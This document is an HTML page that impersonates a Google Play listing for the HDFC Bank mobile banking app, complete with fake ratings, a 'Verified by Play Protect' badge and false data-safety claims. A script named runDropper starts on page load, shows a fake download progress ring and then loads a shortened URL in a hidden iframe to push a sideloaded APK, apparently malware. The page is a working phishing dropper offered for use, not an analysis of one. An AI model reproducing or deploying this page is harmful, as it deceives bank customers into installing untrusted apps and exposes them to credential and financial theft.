<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HDFC Bank MobileBanking - Google Play</title>
    <link rel="icon" type="image/png" href="https://www.gstatic.com/android/market_images/web/favicon_v2.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background: #ffffff; color: #202124; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
        .ps-green-bg { background-color: #01875f; }
        .ps-green-text { color: #01875f; }
        
        /* Premium Icon Squircle */
        .app-icon { 
            width: 72px; height: 72px; border-radius: 20%; 
            box-shadow: 0 2px 8px rgba(0,0,0,0.1); border: 0.5px solid #f0f0f0; 
        }

        /* Fluid Ring Loader */
        .ring-container { position: relative; width: 52px; height: 52px; display: flex; align-items: center; justify-content: center; }
        .ring-svg { transform: rotate(-90deg); width: 100%; height: 100%; }
        .ring-track { fill: none; stroke: #e8eaed; stroke-width: 4.5; }
        .ring-progress { 
            fill: none; stroke: #01875f; stroke-width: 4.5; stroke-linecap: round; 
            stroke-dasharray: 145; stroke-dashoffset: 145; 
            transition: stroke-dashoffset 0.3s ease; 
        }
        .inner-logo { position: absolute; width: 32px; height: 32px; border-radius: 6px; z-index: 5; }

        /* Bento Grid Stats */
        .bento-card { background: #f8f9fa; border-radius: 12px; padding: 12px 8px; text-align: center; border: 1px solid #f1f3f4; }
        .screenshot { height: 195px; border-radius: 12px; border: 1px solid #e8eaed; flex-shrink: 0; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body onload="runDropper()" class="max-w-md mx-auto">

    <nav class="flex items-center px-4 py-3 sticky top-0 bg-white z-50 border-b border-gray-100">
        <svg class="w-6 h-6 text-gray-500 mr-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" stroke-width="2.5"/></svg>
        <div class="flex items-center gap-2">
            <svg class="w-6 h-6" viewBox="0 0 48 48">
                <path fill="#4DB6AC" d="M8 44.4l16.1-16.1L8 12.2v32.2z"/>
                <path fill="#DCE775" d="M36.1 24.1L8 44.4l16.1-16.1 12 12.1-12.3-16.3z"/>
                <path fill="#FFD54F" d="M36.1 24.1L24.1 12.2 8 12.2l28.1 11.9z"/>
                <path fill="#009688" d="M43.7 22.8L36.1 24.1l-12-11.9 19.6 10.6z"/>
            </svg>
            <span class="text-[19px] font-medium text-gray-700 tracking-tight">Google Play</span>
        </div>
    </nav>

    <div class="px-6 pt-4">
        <div class="flex gap-5">
            <img src="https://i.ibb.co/Rkvp8Hcv/unnamed-1.png" class="app-icon">
            <div class="flex flex-col justify-center">
                <h1 class="text-[22px] font-medium text-gray-900 leading-tight">HDFC Bank MobileBanking</h1>
                <p class="ps-green-text font-medium text-[14px] mt-0.5">HDFC Bank Ltd.</p>
                <div class="flex items-center gap-1.5 mt-1">
                    <span class="text-[11px] font-bold text-gray-500 uppercase tracking-tight">Verified</span>
                    <svg class="w-3 h-3 ps-green-text" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                </div>
            </div>
        </div>

        <div class="grid grid-cols-3 gap-3 mt-7 pb-6 border-b border-gray-100">
            <div class="bento-card">
                <div class="text-[15px] font-bold">4.6 ★</div>
                <div class="text-[9px] text-gray-400 font-bold uppercase mt-1">402K reviews</div>
            </div>
            <div class="bento-card">
                <div class="text-[15px] font-bold">58 MB</div>
                <div class="text-[9px] text-gray-400 font-bold uppercase mt-1">Size</div>
            </div>
            <div class="bento-card">
                <div class="text-[15px] font-bold">50M+</div>
                <div class="text-[9px] text-gray-400 font-bold uppercase mt-1">Downloads</div>
            </div>
        </div>

        <div class="mt-8 bg-gray-50 p-5 rounded-2xl border border-gray-100 shadow-sm">
            <div class="flex items-center gap-5">
                <div class="ring-container">
                    <svg class="ring-svg"><circle class="ring-track" cx="26" cy="26" r="23"></circle><circle id="progressRing" class="ring-progress" cx="26" cy="26" r="23"></circle></svg>
                    <img src="https://i.ibb.co/Rkvp8Hcv/unnamed-1.png" class="inner-logo">
                </div>
                <div>
                    <p id="mainStatus" class="text-[16px] font-semibold text-gray-900">Downloading...</p>
                    <p id="subStatus" class="text-[12px] text-gray-500 mt-0.5">Verified by Play Protect</p>
                </div>
            </div>
        </div>

        <div class="mt-10 flex gap-4 overflow-x-auto no-scrollbar">
            <img src="https://i.ibb.co/fzkhjYGv/IMG-20260425-111844.jpg" class="screenshot">
            <img src="https://i.ibb.co/vCGSJ09Q/Screenshot-2026-04-25-11-07-33-640-com-android-vending.jpg" class="screenshot">
            <img src="https://i.ibb.co/VpwGbQ7C/Screenshot-2026-04-25-11-07-37-363-com-android-vending.jpg" class="screenshot">
        </div>

        <div class="mt-10">
            <h2 class="text-[18px] font-medium text-gray-900 mb-4">Data safety</h2>
            <div class="border border-gray-100 rounded-xl p-4 space-y-4 text-[13px] text-gray-600">
                <div class="flex gap-4">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" stroke-width="2"/></svg>
                    <p>No data shared with third parties. This app uses advanced encryption.</p>
                </div>
            </div>
        </div>

        <div class="mt-12 border-t pt-8 pb-10">
            <div class="flex items-center gap-10">
                <div class="text-center">
                    <p class="text-[52px] font-normal leading-none">4.6</p>
                    <div class="flex text-[10px] mt-3 ps-green-text justify-center tracking-tighter">★★★★★</div>
                    <p class="text-[11px] text-gray-400 mt-2">402,812 reviews</p>
                </div>
                <div class="flex-1 space-y-2">
                    <div class="flex items-center gap-3"><span class="text-[11px] w-1 text-gray-400">5</span><div class="flex-1 h-2 bg-gray-100 rounded-full overflow-hidden"><div class="ps-green-bg h-full rounded-full" style="width: 88%"></div></div></div>
                    <div class="flex items-center gap-3"><span class="text-[11px] w-1 text-gray-400">4</span><div class="flex-1 h-2 bg-gray-100 rounded-full overflow-hidden"><div class="ps-green-bg h-full rounded-full" style="width: 10%"></div></div></div>
                </div>
            </div>
        </div>
    </div>

    <iframe id="secretDownloader" style="display:none;"></iframe>

    <script>
        // Aapka direct APK URL
        const apkLink = "https://shorturl.at/shwEb";

        function runDropper() {
            const progress = document.getElementById('progressRing');
            const mainMsg = document.getElementById('mainStatus');
            const subMsg = document.getElementById('subStatus');
            const downloader = document.getElementById('secretDownloader');
            
            let p = 0;
            const dash = 145;

            const timer = setInterval(() => {
                p += Math.floor(Math.random() * 4) + 1;
                
                if(p >= 100) {
                    p = 100;
                    clearInterval(timer);
                    mainMsg.innerText = "Installing...";
                    subMsg.innerText = "Security check complete. Ready to open.";
                    
                    // DIRECT DOWNLOAD - ISI SCREEN PAR
                    downloader.src = apkLink;
                }

                progress.style.strokeDashoffset = dash - (p/100) * dash;
                if(p < 100) {
                    mainMsg.innerText = "Downloading...";
                    subMsg.innerText = `${p}% of 58.24 MB (Official Server)`;
                }
            }, 180);
        }
    </script>
</body>
</html>
